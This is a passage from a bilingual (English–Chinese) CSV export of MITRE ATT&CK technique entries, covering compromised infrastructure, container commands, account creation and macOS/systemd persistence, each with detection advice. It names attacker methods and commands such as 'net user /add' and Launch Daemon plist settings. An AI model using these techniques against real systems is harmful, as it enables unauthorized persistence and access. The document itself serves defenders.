Once compromised, the serverless runtime environment can be leveraged to either respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090) traffic to an adversary-owned command and control server.(Citation: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector) As traffic generated by these functions will appear to come from subdomains of common cloud providers, it may be difficult to distinguish from ordinary traffic to these providers.(Citation: Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare Workers)",https://attack.mitre.org/techniques/T1584/007,08 July 2022,20 October 2022,1.0,Resource Development,,PRE,Internet Scan: Response Content,True,T1584,,Awake Security,,,,,,,",",篡改/破坏基础设施/入侵基础设施：无服务器,攻击者可能会破坏可在定位期间使用的无服务器云基础设施，例如 Cloudflare Workers 或 AWS Lambda 函数。通过利用无服务器基础设施，攻击者可以更难将操作期间使用的基础设施归咎于他们。一旦受到攻击，无服务器运行时环境可以被用来直接响应受感染的机器或 [Proxy](https://attack.mitre.org/techniques/T1090) 到攻击者拥有的命令和控制服务器的流量。（引文: BlackWater Malware Cloudflare Workers)(Citation: AWS Lambda Redirector) 由于这些函数生成的流量似乎来自常见云提供商的子域，因此可能难以区分来自这些提供商的普通流量。（Citation: Detecting Command & Control在云端）（引用：BlackWater Malware Cloudflare Workers）
T1584.003,Compromise Infrastructure: Virtual Private Server,"Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.(Citation: NSA NCSC Turla OilRig)

Compromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.",https://attack.mitre.org/techniques/T1584/003,01 October 2020,17 October 2021,1.1,Resource Development,"Once adversaries have provisioned software on a compromised VPS (ex: for use as a command and control server), internet scans may reveal VPSs that adversaries have compromised. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: Mandiant SCANdalous Jul 2020)(Citation: Koczwara Beacon Hunting Sep 2021)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",PRE,"Internet Scan: Response Content, Internet Scan: Response Metadata",True,T1584,,,,,,,,,"(Citation: NSA NCSC Turla OilRig),",篡改/破坏基础设施/入侵基础设施：虚拟专用服务器,攻击者可能会破坏可在定位期间使用的第三方虚拟专用服务器 (VPS)。存在各种将虚拟机/容器作为服务出售的云服务提供商。攻击者可能会破坏第三方实体购买的 VPS。通过破坏 VPS 以用作基础设施，攻击者可能难以将操作与自身绑定。（引文：NSA NCSC Turla OilRig）破坏 VPS 以用于攻击者生命周期的后期阶段，例如指挥和控制，可以允许攻击者从与声誉较高的云服务提供商以及受感染的第三方添加的普遍性和信任中受益。
T1584.006,Compromise Infrastructure: Web Services,"Adversaries may compromise access to third-party web services that can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567).(Citation: Recorded Future Turla Infra 2020) Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them.",https://attack.mitre.org/techniques/T1584/006,01 October 2020,17 October 2021,1.1,Resource Development,"Once adversaries leverage the abused web service as infrastructure (ex: for command and control), it may be possible to look for unique characteristics associated with adversary software, if known.(Citation: ThreatConnect Infrastructure Dec 2020)

Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)) or [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567).",PRE,Internet Scan: Response Content,True,T1584,,,,,,,,,"(Citation: TrendMicro EarthLusca 2022),(Citation: Recorded Future Turla Infra 2020),",篡改/破坏基础设施/入侵基础设施：Web 服务,攻击者可能会破坏对可在定位期间使用的第三方 Web 服务的访问。存在各种流行的网站供合法用户注册基于 Web 的服务，例如 GitHub、Twitter、Dropbox、Google 等。攻击者可能会尝试获取合法用户对 Web 服务的访问权并将该 Web 服务用作支持网络行动的基础设施。此类 Web 服务可能在攻击者生命周期的后期阶段被滥用，例如在命令和控制期间（[Web 服务](https://attack.mitre.org/techniques/T1102)）或 [通过 Web 服务进行渗透](https ://attack.mitre.org/techniques/T1567)。（引用：Recorded Future Turla Infra 2020）使用通用服务，例如谷歌或 Twitter 提供的服务，可以让对手更容易隐藏在预期的噪音中。通过使用 Web 服务，特别是当合法用户的访问权限被盗时，攻击者可能难以将操作与他们进行物理绑定。
T1609,Container Administration Command,"Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.(Citation: Docker Daemon CLI)(Citation: Kubernetes API)(Citation: Kubernetes Kubelet)

In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as <code>docker exec</code> to execute a command within a running container.(Citation: Docker Entrypoint)(Citation: Docker Exec) In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as <code>kubectl exec</code>.(Citation: Kubectl Exec Get Shell)",https://attack.mitre.org/techniques/T1609,29 March 2021,01 April 2022,1.1,Execution,"Container administration service activities and executed commands can be captured through logging of process execution with command-line arguments on the container and the underlying host. In Docker, the daemon log provides insight into events at the daemon and container service level. Kubernetes system component logs may also detect activities running in and out of containers in the cluster. ",Containers,"Command: Command Execution, Process: Process Creation",False,,,"Alfredo Oliveira, Trend Micro; Brad Geesaman, @bradgeesaman; Center for Threat-Informed Defense (CTID); David Fiser, @anu4is, Trend Micro; Magno Logan, @magnologan, Trend Micro; Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team",,1.0,,,,,"(Citation: Aqua Kinsing April 2020),(Citation: Unit 42 Siloscape Jun 2021),(Citation: Peirates GitHub),(Citation: Unit 42 Hildegard Malware),(Citation: Kubernetes API Control Access),(Citation: Docker Daemon Socket Protect),(Citation: Kubernetes Hardening Guide)",容器管理命令,攻击者可能滥用容器管理服务在容器内执行命令。容器管理服务，例如 Docker 守护程序、Kubernetes API 服务器或 kubelet 可以允许在环境中远程管理容器。（引用：Docker Daemon CLI）（引用：Kubernetes API）（引用：Kubernetes Kubelet）在 Docker 中，攻击者可以在容器部署期间指定一个执行脚本或命令的入口点，或者他们可以使用诸如 <code>docker exec</code> 之类的命令在正在运行的容器中执行命令。（引用：Docker 入口点）（引用： Docker Exec) 在 Kubernetes 中，如果攻击者拥有足够的权限，他们可以通过与 Kubernetes API 服务器、kubelet 交互或通过运行诸如 <code>kubectl exec</code 之类的命令来在集群中的容器中远程执行>.（引用：Kubectl Exec 获取 Shell）
T1613,Container and Resource Discovery,"Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.

These resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution. ",https://attack.mitre.org/techniques/T1613,31 March 2021,12 April 2021,1.0,Discovery,"Establish centralized logging for the activity of container and Kubernetes cluster components. This can be done by deploying logging agents on Kubernetes nodes and retrieving logs from sidecar proxies for application pods to detect malicious activity at the cluster level.

Monitor logs for actions that could be taken to gather information about container infrastructure, including the use of discovery API calls by new or unexpected users. Monitor account activity logs to see actions performed and activity associated with the Kubernetes dashboard and other web applications. ",Containers,"Application Log: Application Log Content, Cluster: Cluster Metadata, Container: Container Enumeration, Container: Container Metadata, Pod: Pod Enumeration, Pod: Pod Metadata",False,,,"Center for Threat-Informed Defense (CTID); Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team",User,,,,,,"(Citation: Cisco Talos Intelligence Group),(Citation: Trend Micro TeamTNT),(Citation: Peirates GitHub),(Citation: Unit 42 Hildegard Malware),(Citation: Kubernetes API Control Access),(Citation: Docker Daemon Socket Protect)",容器和资源发现,攻击者可能会尝试发现容器环境中可用的容器和其他资源。其他资源可能包括图像、部署、pod、节点和其他信息，例如集群的状态。这些资源可以在 Kubernetes 仪表板等 Web 应用程序中查看，也可以通过 Docker 和 Kubernetes API 进行查询。（引用：Docker API）（引用：Kubernetes API）在 Docker 中，日志可能会泄露有关环境的信息，例如环境的配置、可用的服务以及受害者可能使用的云提供商。这些资源的发现可能会通知对手在环境中的下一步，例如如何执行横向移动以及使用哪些方法来执行。
T1136,Create Account,"Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.

Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.",https://attack.mitre.org/techniques/T1136,14 December 2017,12 August 2021,2.2,Persistence,"Monitor for processes and command-line parameters associated with account creation, such as <code>net user</code> or <code>useradd</code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system and domain controller. (Citation: Microsoft User Creation Event) Perform regular audits of domain and local system accounts to detect suspicious accounts that may have been created by an adversary.

Collect usage logs from cloud administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.","Azure AD, Google Workspace, IaaS, Linux, Office 365, Windows, macOS","Command: Command Execution, Process: Process Creation, User Account: User Account Creation",False,,,Microsoft Threat Intelligence Center (MSTIC); Praetorian,Administrator,,,,,,"(Citation: Symantec WastedLocker June 2020),(Citation: Dragos Crashoverride 2018),",创建账户,攻击者可能会创建一个帐户来维持对受害系统的访问。通过足够的访问级别，创建此类帐户可用于建立不需要在系统上部署持久远程访问工具的辅助凭证访问。可以在本地系统或域或云租户内创建帐户。在云环境中，攻击者可能会创建只能访问特定服务的帐户，这会降低被检测到的机会。
T1136.003,Create Account: Cloud Account,"Adversaries may create a cloud account to maintain access to victim systems. With a sufficient level of access, such accounts may be used to establish secondary credentialed access that does not require persistent remote access tools to be deployed on the system.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: AWS Create IAM User)(Citation: GCP Create Cloud Identity Users)(Citation: Microsoft Azure AD Users)

Adversaries may create accounts that only have access to specific cloud services, which can reduce the chance of detection.",https://attack.mitre.org/techniques/T1136/003,29 January 2020,07 April 2022,1.2,Persistence,Collect usage logs from cloud user and administrator accounts to identify unusual activity in the creation of new accounts and assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins.,"Azure AD, Google Workspace, IaaS, Office 365, SaaS",User Account: User Account Creation,True,T1136,,Microsoft Threat Intelligence Center (MSTIC); Praetorian,,,,,,,"(Citation: AADInternals Documentation),(Citation: MSTIC Nobelium Oct 2021),(Citation: MSTIC DEV-0537 Mar 2022),",创建账户：云账户,攻击者可能会创建一个云帐户来维护对受害系统的访问。有了足够的访问级别，此类帐户可用于建立不需要在系统上部署持久远程访问工具的辅助凭据访问。（引用：Microsoft O365 管理员角色）（引用：Microsoft 支持 O365 添加另一个管理员， 2019 年 10 月）（引用：AWS 创建 IAM 用户）（引用：GCP 创建云身份用户）（引用：Microsoft Azure AD 用户）攻击者可能创建只能访问特定云服务的帐户，这会降低被检测到的机会。
T1136.002,Create Account: Domain Account,"Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.

Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",https://attack.mitre.org/techniques/T1136/002,28 January 2020,23 March 2020,1.0,Persistence,"Monitor for processes and command-line parameters associated with domain account creation, such as <code>net user /add /domain</code>. Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows domain controller. (Citation: Microsoft User Creation Event) Perform regular audits of domain accounts to detect suspicious accounts that may have been created by an adversary.","Linux, Windows, macOS","Command: Command Execution, Process: Process Creation, User Account: User Account Creation",True,T1136,,,Administrator,,,,,,"(Citation: GitHub Pupy),(Citation: Microsoft GALLIUM December 2019),(Citation: Volexity Exchange Marauder March 2021),(Citation: Savill 1999),(Citation: Github PowerShell Empire),(Citation: NCC Group Fivehands June 2021),(Citation: Cybereason Soft Cell June 2019),(Citation: Dragos Crashoverride 2018),",创建账户：域账户,攻击者可能会创建一个域帐户来维护对受害系统的访问。域帐户是由 Active Directory 域服务管理的帐户，其中跨系统和属于该域的服务配置访问和权限。域帐户可以涵盖用户、管理员和服务帐户。通过足够的访问级别，<code>net user /add /domain</code> 命令可用于创建域帐户。此类帐户可用于建立不需要在系统上部署持久远程访问工具的二级凭证访问。
T1136.001,Create Account: Local Account,"Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. With a sufficient level of access, the <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account.

Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.",https://attack.mitre.org/techniques/T1136/001,28 January 2020,12 August 2021,1.1,Persistence,"Monitor for processes and command-line parameters associated with local account creation, such as <code>net user /add</code> , <code>useradd</code> , and <code>dscl -create</code> . Collect data on account creation within a network. Event ID 4720 is generated when a user account is created on a Windows system. (Citation: Microsoft User Creation Event) Perform regular audits of local system accounts to detect suspicious accounts that may have been created by an adversary.","Linux, Windows, macOS","Command: Command Execution, Process: Process Creation, User Account: User Account Creation",True,T1136,,,Administrator,,,,,,"(Citation: Symantec Calisto July 2018),(Citation: Kaspersky Flame Functionality),(Citation: Intezer HiddenWasp Map 2019),(Citation: aptsim),(Citation: Trustwave GoldenSpy June 2020),(Citation: Savill 1999),(Citation: Github PowerShell Empire),(Citation: GitHub Pupy),(Citation: BitDefender Chafer May 2020),(Citation: Intezer TeamTNT September 2020),(Citation: FireEye APT41 Aug 2019),(Citation: Unit 42 Hildegard Malware),(Citation: Talos ZxShell Oct 2014),(Citation: Kaspersky Flame),(Citation: FireEye CARBANAK June 2017),(Citation: FireEye SMOKEDHAM June 2021),(Citation: ClearSky Pay2Kitten December 2020),(Citation: KISA Operation Muzabi),(Citation: US-CERT TA18-074A),(Citation: Symantec Leafminer July 2018),(Citation: DFIR Report APT35 ProxyShell March 2022),(Citation: Cylance Dust Storm),(Citation: Proofpoint TA505 Jan 2019),",创建帐户：本地帐户,攻击者可能会创建一个本地帐户来维护对受害系统的访问。本地帐户是由组织配置供用户、远程支持、服务使用或用于管理单个系统或服务的帐户。通过足够的访问级别，<code>net user /add</code> 命令可用于创建本地帐户。在 macOS 系统上，<code>dscl -create</code> 命令可用于创建本地帐户。此类帐户可用于建立不需要在系统上部署持久远程访问工具的二级凭证访问。
T1543,Create or Modify System Process,"Adversaries may create or modify system-level processes to repeatedly execute malicious payloads as part of persistence. When operating systems boot up, they can start processes that perform background system functions. On Windows and Linux, these system processes are referred to as services.(Citation: TechNet Services) On macOS, launchd processes known as [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) and [Launch Agent](https://attack.mitre.org/techniques/T1543/001) are run to finish system initialization and load user specific parameters.(Citation: AppleDocs Launch Agent Daemons) 

Adversaries may install new services, daemons, or agents that can be configured to execute at startup or a repeatable interval in order to establish persistence. Similarly, adversaries may modify existing services, daemons, or agents to achieve the same effect.  

Services, daemons, or agents may be created with administrator privileges but executed under root/SYSTEM privileges. Adversaries may leverage this functionality to create or modify system processes in order to escalate privileges.(Citation: OSX Malware Detection)  ",https://attack.mitre.org/techniques/T1543,10 January 2020,20 April 2022,1.1,"Persistence, Privilege Escalation","Monitor for changes to system processes that do not correlate with known software, patch cycles, etc., including by comparing results against a trusted system baseline. New, benign system processes may be created during installation of new software. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.  

Command-line invocation of tools capable of modifying services may be unusual, depending on how systems are typically used in a particular environment. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. 

Monitor for changes to files associated with system-level processes.","Linux, Windows, macOS","Command: Command Execution, Driver: Driver Load, File: File Creation, File: File Modification, Process: OS API Execution, Process: Process Creation, Service: Service Creation, Service: Service Modification, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification",False,,,,,,,,,,"(Citation: ANSSI Sandworm January 2021),(Citation: Microsoft driver block rules),(Citation: Malicious Driver Reporting Center)",创建或修改系统进程,作为持久性的一部分，攻击者可能会创建或修改系统级进程以重复执行恶意负载。当操作系统启动时，它们可以启动执行后台系统功能的进程。在 Windows 和 Linux 上，这些系统进程称为服务。（引用：TechNet 服务）在 macOS 上，启动进程称为 [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) 和 [启动代理](https://attack.mitre.org/techniques/T1543/001) 运行以完成系统初始化并加载用户特定参数。（引用：AppleDocs 启动代理守护程序）攻击者可能会安装新的服务、守护程序或代理可以配置为在启动时执行或以可重复的时间间隔执行，以建立持久性。类似地，攻击者可能会修改现有的服务、守护进程或代理以达到相同的效果。可以使用管理员权限创建服务、守护程序或代理，但在 root/SYSTEM 权限下执行。攻击者可以利用此功能创建或修改系统进程以提升权限。（引用：OSX 恶意软件检测）
T1543.001,Create or Modify System Process: Launch Agent,"Adversaries may create or modify launch agents to repeatedly execute malicious payloads as part of persistence. When a user logs in, a per-user launchd process is started which loads the parameters for each launch-on-demand user agent from the property list (.plist) file found in <code>/System/Library/LaunchAgents</code>, <code>/Library/LaunchAgents</code>, and <code>~/Library/LaunchAgents</code>.(Citation: AppleDocs Launch Agent Daemons)(Citation: OSX Keydnap malware) (Citation: Antiquated Mac Malware) Property list files use the <code>Label</code>, <code>ProgramArguments </code>, and <code>RunAtLoad</code> keys to identify the Launch Agent's name, executable location, and execution time.(Citation: OSX.Dok Malware) Launch Agents are often installed to perform updates to programs, launch user specified programs at login, or to conduct other developer tasks.

 Launch Agents can also be executed using the [Launchctl](https://attack.mitre.org/techniques/T1569/001) command.
 
Adversaries may install a new Launch Agent that executes at login by placing a .plist file into the appropriate folders with the <code>RunAtLoad</code> or <code>KeepAlive</code> keys set to <code>true</code>.(Citation: Sofacy Komplex Trojan)(Citation: Methods of Mac Malware Persistence) The Launch Agent name may be disguised by using a name from the related operating system or benign software. Launch Agents are created with user level privileges and execute with user level permissions.(Citation: OSX Malware Detection)(Citation: OceanLotus for OS X) ",https://attack.mitre.org/techniques/T1543/001,17 January 2020,21 April 2022,1.4,"Persistence, Privilege Escalation","Monitor Launch Agent creation through additional plist files and utilities such as Objective-See’s  KnockKnock application. Launch Agents also require files on disk for persistence which can also be monitored via other file monitoring applications.

Ensure Launch Agent's <code> ProgramArguments </code> key pointing to executables located in the <code>/tmp</code> or <code>/shared</code> folders are in alignment with enterprise policy. Ensure all Launch Agents with the <code>RunAtLoad</code> key set to <code>true</code> are in alignment with policy. ",macOS,"Command: Command Execution, File: File Creation, File: File Modification, Service: Service Creation, Service: Service Modification",True,T1543,,"Antonio Piazza, @antman1p","Administrator, User",,,,,,"(Citation: CheckPoint Dok),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: Unit42 CookieMiner Jan 2019),(Citation: objsee mac malware 2017),(Citation: Securelist Calisto July 2018),(Citation: TrendMicro MacOS April 2018),(Citation: synack 2016 review),(Citation: Objective-See MacMa Nov 2021),(Citation: Trend Micro MacOS Backdoor November 2020),(Citation: CoinTicker 2019),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: wardle evilquest parti),(Citation: Red Canary NETWIRE January 2020),(Citation: Lookout Dark Caracal Jan 2018),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: TrendMicro macOS Dacls May 2020),(Citation: ESET DazzleSpy Jan 2022),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Sofacy Komplex Trojan),(Citation: piazza launch agent mitigation)",创建或修改系统进程：启动代理,作为持久性的一部分，攻击者可能会创建或修改启动代理以重复执行恶意有效负载。当用户登录时，每用户启动进程会启动，该进程会从 <code>/System/Library/LaunchAgents</code 中的属性列表 (.plist) 文件中加载每个按需启动用户代理的参数>、<code>/Library/LaunchAgents</code> 和 <code>~/Library/LaunchAgents</code>。（引用：AppleDocs Launch Agent Daemons）（引用：OSX Keydnap 恶意软件）（引用：过时的 Mac 恶意软件）属性列表文件使用 <code>Label</code>、<code>ProgramArguments </code> 和 <code>RunAtLoad</code> 键来标识启动代理的名称、可执行位置和执行时间。（引文： OSX.Dok Malware）启动代理通常被安装来执行程序更新，在登录时启动用户指定的程序，或执行其他开发任务。启动代理也可以使用 [Launchctl](https://attack.mitre.org/techniques/T1569/001) 命令执行。攻击者可以安装一个新的启动代理，通过将 .plist 文件放入适当的文件夹，并将 <code>RunAtLoad</code> 或 <code>KeepAlive</code> 键设置为 <code>true</code >.(Citation: Sofacy Komplex Trojan)(Citation: Methods of Mac Malware Persistence) Launch Agent 名称可能使用相关操作系统或良性软件的名称进行伪装。启动代理是使用用户级权限创建的，并以用户级权限执行。（引用：OSX 恶意软件检测）（引用：OceanLotus for OS X）
T1543.004,Create or Modify System Process: Launch Daemon,"Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in <code>/System/Library/LaunchDaemons/</code> and <code>/Library/LaunchDaemons/</code>. Required Launch Daemons parameters include a <code>Label</code> to identify the task, <code>Program</code> to provide a path to the executable, and <code>RunAtLoad</code> to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.(Citation: AppleDocs Launch Agent Daemons)(Citation: Methods of Mac Malware Persistence)(Citation: launchd Keywords for plists)

Adversaries may install a Launch Daemon configured to execute at startup by using the <code>RunAtLoad</code> parameter set to <code>true</code> and the <code>Program</code> parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. [Masquerading](https://attack.mitre.org/techniques/T1036)). When the Launch Daemon is executed, the program inherits administrative permissions.(Citation: WireLurker)(Citation: OSX Malware Detection)

Additionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as <code>usr/local/bin</code> to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.(Citation: LaunchDaemon Hijacking)(Citation: sentinelone macos persist Jun 2019)",https://attack.mitre.org/techniques/T1543/004,17 January 2020,07 October 2021,1.2,"Persistence, Privilege Escalation","Monitor for new files added to the <code>/Library/LaunchDaemons/</code> folder. The System LaunchDaemons are protected by SIP.

Some legitimate LaunchDaemons point to unsigned code that could be exploited. For Launch Daemons with the <code>RunAtLoad</code> parameter set to true, ensure the <code>Program</code> parameter points to signed code or executables are in alignment with enterprise policy. Some parameters are interchangeable with others, such as <code>Program</code> and <code>ProgramArguments</code> parameters but one must be present.(Citation: launchd Keywords for plists)

",macOS,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Service: Service Creation, Service: Service Modification",True,T1543,,,Administrator,,,"CAPEC-550, CAPEC-551",,"Administrator, root","(Citation: sentinelone apt32 macOS backdoor 2020),(Citation: wardle evilquest parti),(Citation: trendmicro xcsset xcode project 2020),(Citation: ESET LoudMiner June 2019),(Citation: MacKeeper Bundlore Apr 2019),(Citation: SentinelOne Lazarus macOS July 2020),(Citation: TrendMicro MacOS April 2018),(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: TrendMicro macOS Dacls May 2020),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: CISA AppleJeus Feb 2021),(Citation: ObjectiveSee AppleJeus 2019),",创建或修改系统进程：启动守护进程,作为持久性的一部分，攻击者可能会创建或修改启动守护程序以执行恶意负载。 Launch Daemons 是用于与 macOS 使用的服务管理框架 Launchd 交互的 plist 文件。启动守护程序需要提升的权限才能安装，在登录之前为系统上的每个用户执行，并在后台运行而无需用户交互。在 macOS 初始化启动期间，launchd 进程从 <code>/System/Library/LaunchDaemons/</code> 和 <code>/Library/LaunchDaemons/ 中的 plist 文件中加载按需启动系统级守护进程的参数</代码>。必需的启动守护程序参数包括标识任务的 <code>Label</code>、提供可执行文件路径的 <code>Program</code> 以及指定任务何时执行的 <code>RunAtLoad</code>跑。启动守护程序通常用于提供对共享资源的访问、软件更新或执行自动化任务。（引用：AppleDocs 启动代理守护程序）（引用：Mac 恶意软件持久性方法）（引用：plists 的launchd 关键字）攻击者可能会安装一个使用设置为 <code>true</code> 的 <code>RunAtLoad</code> 参数和设置为恶意可执行文件路径的 <code>Program</code> 参数配置为在启动时执行的启动守护程序。守护进程名称可以通过使用来自相关操作系统或良性软件的名称来伪装（即[伪装]（https://attack.mitre.org/techniques/T1036））。执行 Launch Daemon 时，程序会继承管理权限。(Citation: WireLurker)(Citation: OSX Malware Detection) 此外，系统配置更改（例如安装第三方包管理软件）可能会导致文件夹如 <code> usr/local/bin</code> 变为全局可写。因此，糟糕的配置有可能允许攻击者修改当前 Launch Daemon 的 plist 文件引用的可执行文件。（引用：LaunchDaemon Hijacking）（引用：sentinelone macos persist Jun 2019）
T1543.002,Create or Modify System Process: Systemd Service,"Adversaries may create or modify systemd services to repeatedly execute malicious payloads as part of persistence. The systemd service manager is commonly used for managing background daemon processes (also known as services) and other system resources.(Citation: Linux man-pages: systemd January 2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default initialization (init) system on many Linux distributions starting with Debian 8, Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems including SysVinit and Upstart while remaining backwards compatible with the aforementioned init systems.

Systemd utilizes configuration files known as service units to control how services boot and under what conditions. By default, these unit files are stored in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories and have the file extension <code>.service</code>. Each service unit file may contain numerous directives that can execute system commands:

* ExecStart, ExecStartPre, and ExecStartPost directives cover execution of commands when a services is started manually by 'systemctl' or on system start if the service is set to automatically start. 
* ExecReload directive covers when a service restarts. 
* ExecStop and ExecStopPost directives cover when a service is stopped or manually by 'systemctl'.

Adversaries have used systemd functionality to establish persistent access to victim systems by creating and/or modifying service unit files that cause systemd to execute malicious commands at system boot.(Citation: Anomali Rocke March 2019)

While adversaries typically require root privileges to create/modify service unit files in the <code>/etc/systemd/system</code> and <code>/usr/lib/systemd/system</code> directories, low privilege users can create/modify service unit files in directories such as <code>~/.config/systemd/user/</code> to achieve user-level persistence.(Citation: Rapid7 Service Persistence 22JUNE2016)",https://attack.mitre.org/techniques/T1543/002,17 January 2020,09 October 2020,1.2,"Persistence, Privilege Escalation","Systemd service unit files may be detected by auditing file creation and modification events within the <code>/etc/systemd/system</code>, <code>/usr/lib/systemd/system/</code>, and <code>/home/<username>/.config/systemd/user/</code> directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.

Suspicious systemd services can also be identified by comparing results against a trusted system baseline. Malicious systemd services may be detected by using the systemctl utility to examine system wide services: <code>systemctl list-units -–type=service –all</code>. Analyze the contents of <code>.service</code> files present on the file system and ensure that they refer to legitimate, expected executables.

Auditing the execution and command-line arguments of the 'systemctl' utility, as well related utilities such as <code>/usr/sbin/service</code> may reveal malicious systemd service execution.",Linux,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Service: Service Creation, Service: Service Modification",True,T1543,,"Tony Lambert, Red Canary","root, User",,,"CAPEC-550, CAPEC-551",,,"(Citation: GitHub Pupy),(Citation: Anomali Rocke March 2019),(Citation: ESET TeleBots Oct 2018),(Citation: ANSSI Sandworm January 2021),(Citation: Trend Micro TeamTNT),(Citation: Fysbis Dr Web Analysis),(Citation: Cisco Talos Intelligence Group),(Citation: Unit 42 Hildegard Malware),",创建或修改系统进程：Systemd 服务,作为持久性的一部分，攻击者可能会创建或修改 systemd 服务以重复执行恶意有效负载。 systemd 服务管理器通常用于管理后台守护进程（也称为服务）和其他系统资源。（引用：Linux 手册页：systemd 2014 年 1 月）（引用：Freedesktop.org Linux systemd 29SEP2018） Systemd 是默认初始化从 Debian 8、Ubuntu 15.04、CentOS 7、RHEL 7、Fedora 15 开始的许多 Linux 发行版上的 (init) 系统，并替换了包括 SysVinit 和 Upstart 在内的传统 init 系统，同时保持与上述初始化系统的向后兼容。 Systemd 利用称为服务单元的配置文件来控制服务如何启动以及在什么条件下启动。默认情况下，这些单元文件存储在 <code>/etc/systemd/system</code> 和 <code>/usr/lib/systemd/system</code> 目录中，文件扩展名为 <code>.service </代码>。每个服务单元文件可能包含许多可以执行系统命令的指令： * ExecStart、ExecStartPre 和 ExecStartPost 指令涵盖了当服务由“systemctl”手动启动时或系统启动时（如果服务设置为自动启动）时的命令执行。 * ExecReload 指令涵盖服务何时重新启动。 * ExecStop 和 ExecStopPost 指令涵盖服务何时停止或由“systemctl”手动停止。攻击者使用 systemd 